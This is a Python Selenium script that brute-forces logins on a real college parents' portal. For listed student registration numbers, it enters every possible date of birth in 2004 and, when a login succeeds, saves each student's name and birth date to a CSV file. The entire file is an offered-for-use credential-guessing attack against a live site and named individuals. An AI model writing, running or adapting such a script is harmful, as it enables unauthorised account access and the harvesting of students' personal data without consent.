from selenium import webdriver
from bs4 import BeautifulSoup
import requests
import time

B_URL = "./chromedriver.exe"
T_URL = "https://parents.msrit.edu/parents_even2022/"

# browser = webdriver.Chrome()
# browser.get('http:/google.com')
b1 = webdriver.Chrome(executable_path=B_URL)
b1.get(T_URL)
b2 = webdriver.Chrome(executable_path=B_URL)
b2.get(T_URL)
DEPT = "CI"
u = ['1MS21CI025', '1MS21CI032', '1MS21CI033']
months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
year = "2004"

with open(f'#dob05.csv', 'w+') as f:
    for k in u:
        success = 0
        usn1 = f"1MS21{DEPT}032"
        usn2 = f"1MS21{DEPT}033"
        # usn = k
        for j in months:
            for i in range(1, 32):
                b1.find_element_by_id("username").send_keys(f"{usn1}")
                b1.find_element_by_id("dd").send_keys(f"{i:02}")
                b1.find_element_by_id("mm").send_keys(f"{j}")
                b1.find_element_by_id("yyyy").send_keys(f"{year}")
                b1.find_elements_by_tag_name("input")[6].click()
                b2.find_element_by_id("username").send_keys(f"{usn2}")
                b2.find_element_by_id("dd").send_keys(f"{i:02}")
                b2.find_element_by_id("mm").send_keys(f"{j}")
                b2.find_element_by_id("yyyy").send_keys(f"{year}")
                b2.find_elements_by_tag_name("input")[6].click()
                try:
                    name1 = b1.find_element_by_tag_name("h3")
                    if name1.text != "Notice Board":
                        success = 1
                        data = f"{k}{name1.text} date of birth is {i:02} {j} {year}\n"
                        # datap = f'1MS21CI{k:03}, {name.text}, {i:02}/{j}/{year}\n'
                        datap1 = f'{usn1}, {name1.text}, {i:02}/{j}/{year}\n'
                        print(data)
                        f.write(datap1)
                    b1.back()
                except Exception as e:
                    print(e)
                    b1.back()
                try:
                    name2 = b2.find_element_by_tag_name("h3")
                    if name2.text != "Notice Board":
                        success = 1
                        data = f"{k}{name2.text} date of birth is {i:02} {j} {year}\n"
                        # datap = f'1MS21CI{k:03}, {name.text}, {i:02}/{j}/{year}\n'
                        datap2 = f'{usn2}, {name2.text}, {i:02}/{j}/{year}\n'
                        print(data)
                        f.write(datap2)
                    b2.back()
                except Exception as e:
                    print(e)
                    b2.back()
                if success == 1:
                    break

# browser.execute_script(f"window.open('about:blank', 'tab{i}');")
# browser.switch_to.window(f"tab{i}")
